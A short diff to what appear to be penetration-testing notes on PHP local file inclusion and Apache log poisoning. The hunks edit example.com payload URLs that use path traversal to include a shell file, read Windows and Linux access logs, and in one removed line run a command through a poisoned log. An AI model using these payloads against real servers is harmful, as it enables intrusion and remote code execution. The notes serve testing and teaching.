@@ -16,8 +16,11 @@
 1. http://example.com/file.php?file=/../../../var/www/html/myshell.exe
 
 #Check whether we can poison log files.
+	#Check can you read / access the log file? This a good first indication that might be the attack path.
 	#Apache
-	1. http://example.com/file.php?file=../..//xampp/apache/logs/access.log&cmd=dir
+	1. Windows: http://example.com/file.php?file=/../../../xampp/apache/logs/access.log
+	2. Linux: http://example.com/file.php?file=/../../../var/log/apache2/access.log
+	3. 
 ```
 ##### PT
 ```
